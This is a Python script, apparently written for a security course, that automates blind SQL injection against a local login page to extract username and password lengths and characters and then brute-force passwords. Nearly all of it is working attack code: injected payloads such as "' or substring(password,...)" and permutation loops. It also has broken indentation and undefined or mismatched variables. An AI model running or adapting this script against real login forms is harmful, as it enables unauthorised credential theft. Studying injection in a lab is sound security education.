""""
Author: Ben Bornholm
Date: 2-23-16
Class: CSEC-471
Description: Request username and passwords from a database in a effective manner

SQL commands:
Min length in col: SELECT min(length(<column>)) FROM <table name>;
Max length in col: SELECT max(length(<column>)) FROM <table name>;
Get letter at this position: SELECT SUBSTRING(<column>, <char postion>, <# of chars>)

To do:
	1. output file
	2. allow max number for usernmae/password length
	3. password char grabber not getting numbers!!!
"""
import time
import itertools
import requests
import code
import urllib2
import urllib
from bs4 import BeautifulSoup
from bs4 import Comment
import sys, getopt
from string import ascii_lowercase
from string import digits

def getRequest(params):
	with requests.Session() as s:
		s = requests.session()
		s.close()
		r = s.post('http://127.0.0.1/blind/login.php', data=params)
		bsObj = BeautifulSoup(r.text)
        	return bsObj.find('div', {'class':'message'})


def main():
	if len(sys.argv) == 1:
		print "python\
				-v1: Verbosity 1: Only username and passwords\
				-v2: Verbosity 2: Shows output from server and v1\
				-o: Output file\
				-n: max number to"  

        #get min and max username char length    
	minUser=0
        maxUser=0
        x=0
        for i in range(1,10):
		str1 = """' or length(userName) = %d -- " """%(i)
                params = {'userName': str1, 'password':''}

                message = getRequest(params)
                if 'successful' in message.text:
                        if x == 0:
                                minUser = i
                                maxUser = i
                                x = 1
                        if i > maxUser:
                                maxUser= i
	
	print "Password length"
        print minUser
        print maxUser

	#get min and max password char length
	passMin=0
	passMax=0
	x=0

	for i in range(1,10):
		str1 = """' or length(password) = %d -- " """%(i)
                params = {'userName': '', 'password':str1}

                message = getRequest(params)
                if 'successful' in message.text:
                        if x == 0:
                                minPass = i
                                maxPass = i
                                x = 1
                        if i > maxPass:
                                maxPass= i

        print "Password length"
        print minPass
        print maxPass

	
	#get all characters used for username
	userCharList = []
	startUserCharList = []
	for alpha in ascii_lowercase:
        	for i in range(1,maxUser+1):
                	str1 = """' or substring(userName,%s,1) = "%s"-- " """%(i,alpha)
                	params = {'userName': str1, 'password': ''}

                	message = getRequest(params)

                	if 'successful' in message.text:
                        	if alpha not in userCharList:
                                	userCharList.append(alpha)
					
					if i == 1:
						startUserCharList.append(alpha)

	print userCharList
	print "Starting characters for user list"
	print startUserCharList


	
	#get all characters used for password
	passCharList = []
	startPassCharList = []
        for alpha in ascii_lowercase+digits:
                for i in range(1,maxPass+1):
			
			str1 = """' or substring(password,%s,1) = "%s"-- " """%(i,str(alpha))
			params = {'userName': '', 'password': str1}

                        message = getRequest(params)

                        if 'successful' in message.text:
                                if alpha not in passCharList:
                                        print alpha
					passCharList.append(alpha)

					if i == 1:
						startPassCharList.append(alpha)
        print passCharList
	
	#generate starting of passwords
	print "before temp pass for perms"
	tempStartList= list(itertools.permutations(passCharList,3))
	print "after temp pass for perms"	

	passPerm2List= []	
	for x in tempStartList:
		str2 = ''.join(x)
                
		str1 = """' or substring(password,1,3) = "%s"-- " """%(str(str2))
		params = {'userName': '', 'password': str1}
               
		print params
               	message = getRequest(params)

              	if 'successful' in message.text:
                	print message.text
			passPerm2List.append(str2)

		time.sleep(0.01)
	print passPerm2List	


	#generate permuatations for usernames
#	print "Before usename generation"
#	permListUser = []
#	for l in range(minUser,maxUser+1): 
#		for x in itertools.permutations(userCharList,l):
#			if x[0] in startUserCharList:
#				permListUser.append(x)
#				print x

#	print "After username generation"
#	print len(permListUser)


#	userNameList = []
#	for x in permListUser:
#		str2 =  ''.join(x)

#	      	str1 = """ ' or (userName = "%s") -- " """%(str2)
#	        params = {'userName': str1, 'password': ''}
		
#		print params

#       		message = getRequest(params)	
#		if 'successful' in message.text:
#                	userNameList.append(str2)
#               	print("[+] : Message received:", message.text)
#		time.sleep(0.01)

#	print len(permListUser)
#	print userNameList


	
	#generate permutations for passwords
	print "before password permutations"
	permListPass = []

	for l in range(minPass,maxPass): 
		for x in itertools.permutations(passCharList,l):
			str2 = ''.join(x)
			if str2[:3] in passPerm2List:
				permListPass.append(str2)

	print "after password permutations"
	print len(permListPass)

	passNameList = []
     	for x in permListPass:
               	#str2 =  ''.join(x)
		str2=x
		str1 = """ ' or (password = "%s") -- " """%(str2)
              	params = {'userName': '', 'password': str1}
		print params
               	message = getRequest(params)

              	if 'successful' in message.text:
                        passNameList.append(str2)
                        print("Message received:", message.text)

		time.sleep(0.01)
	print len(permListUser)
        print passNameList




main()
